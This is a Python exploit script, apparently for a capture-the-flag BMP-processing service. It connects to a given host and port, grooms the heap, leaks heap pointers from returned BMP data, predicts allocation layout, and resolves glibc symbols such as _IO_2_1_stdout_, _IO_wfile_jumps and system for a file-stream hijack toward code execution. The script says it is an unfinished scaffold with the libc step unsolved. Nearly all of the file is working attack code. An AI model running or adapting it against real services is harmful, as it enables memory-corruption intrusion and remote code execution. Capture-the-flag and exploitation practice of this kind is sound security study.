#!/usr/bin/env python3
import base64
import os
import re
import socket
import struct
import subprocess
import sys
from typing import List, Tuple

sys.path.append('/mnt/data')
import bmpcutter3_solve_v3 as base

MMAP_DELTA_TO_LIBC_BASE = 0x33FF0  # observed locally for bfSize=0x30000 (glibc 2.41)
DEFAULT_BFSIZE = 0x30000


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    buf = bytearray()
    while marker not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)


def unique_heap_qwords(blob: bytes) -> List[int]:
    vals: List[int] = []
    seen = set()
    for off in range(0, len(blob) - 8):
        q = struct.unpack_from('<Q', blob, off)[0]
        if (q >> 40) in (0x55, 0x56, 0x57) and q not in seen:
            seen.add(q)
            vals.append(q)
    return sorted(vals, reverse=True)


def parse_biggest_bmp(out: bytes) -> bytes:
    blobs = []
    for m in re.finditer(rb'"base64_data": "([A-Za-z0-9+/=]+)"', out):
        try:
            blobs.append(base64.b64decode(m.group(1)))
        except Exception:
            pass
    if not blobs:
        raise RuntimeError('no BMP blobs found in service output')
    return max(blobs, key=len)


def resolve_symbol(libc_path: str, name: str) -> int:
    out = subprocess.check_output(['nm', '-D', libc_path], text=True, errors='ignore')
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and (parts[2] == name or parts[2].startswith(name + '@@')):
            return int(parts[0], 16)
    raise RuntimeError(f'symbol not found: {name}')


def compute_turn3_layout(leaked_desc: List[int]) -> Tuple[int, int, int, int, int]:
    # After turn 2 free order, turn 3 allocations for 4 tiles of size 0x100 reuse:
    #   tiles_array = highest + 0x110
    #   pixel3     = highest
    #   pixel2     = next
    #   pixel1     = next
    #   pixel0     = lowest
    if len(leaked_desc) < 4:
        raise RuntimeError('need at least 4 leaked heap pointers')
    pix3, pix2, pix1, pix0 = leaked_desc[:4]
    tiles_array = pix3 + 0x110
    return tiles_array, pix0, pix1, pix2, pix3


def candidate_offbits(libc_path: str, mmap_delta: int = MMAP_DELTA_TO_LIBC_BASE) -> int:
    off_stdout = resolve_symbol(libc_path, '_IO_2_1_stdout_')
    return mmap_delta + off_stdout


def main() -> None:
    if len(sys.argv) not in (3, 4):
        print(f'Usage: {sys.argv[0]} HOST PORT [./libc.so.6]')
        raise SystemExit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    libc_path = sys.argv[3] if len(sys.argv) == 4 else None

    with socket.create_connection((host, port), timeout=5) as s:
        banner = recv_until(s, b'Paste your Base64-encoded BMP data', timeout=5)
        sys.stdout.write(banner.decode(errors='ignore'))

        s.sendall(base.turn1_groom())
        out1 = recv_until(s, b'Paste your Base64-encoded BMP data', timeout=5)
        sys.stdout.write(out1.decode(errors='ignore'))

        s.sendall(base.turn2_stable_leak())
        out2 = recv_until(s, b'Paste your Base64-encoded BMP data', timeout=5)
        sys.stdout.write(out2.decode(errors='ignore'))

    blob = parse_biggest_bmp(out2)
    leaked = unique_heap_qwords(blob)
    print(f'\n[+] largest BMP leak: {len(blob)} bytes')
    print('[+] leaked heap-like qwords:')
    for q in leaked[:8]:
        print(f'    {q:#x}')

    tiles_array, pix0, pix1, pix2, pix3 = compute_turn3_layout(leaked)
    print('\n[+] predicted turn-3 0x110 layout:')
    print(f'    tiles_array = {tiles_array:#x}')
    print(f'    pixel0      = {pix0:#x}   (good candidate: stdout patch source)')
    print(f'    pixel1      = {pix1:#x}   (good candidate: fake lock)')
    print(f'    pixel2      = {pix2:#x}   (good candidate: fake wide_data)')
    print(f'    pixel3      = {pix3:#x}   (good candidate: fake vtable + overflow source)')

    if libc_path:
        off_stdout = resolve_symbol(libc_path, '_IO_2_1_stdout_')
        off_wfile = resolve_symbol(libc_path, '_IO_wfile_jumps')
        off_system = resolve_symbol(libc_path, 'system')
        print('\n[+] libc offsets from provided libc:')
        print(f'    _IO_2_1_stdout_ = {off_stdout:#x}')
        print(f'    _IO_wfile_jumps = {off_wfile:#x}')
        print(f'    system          = {off_system:#x}')
        print(f'    candidate bfOffBits for stdout (needs local validation): {candidate_offbits(libc_path):#x}')

        print('\n[!] This scaffold only automates the stable leak and turn-3 heap prediction.')
        print('[!] The remaining unsolved part is getting absolute libc pointers for system/_IO_wfile_jumps or replacing them with a true partial-overwrite strategy.')


if __name__ == '__main__':
    main()
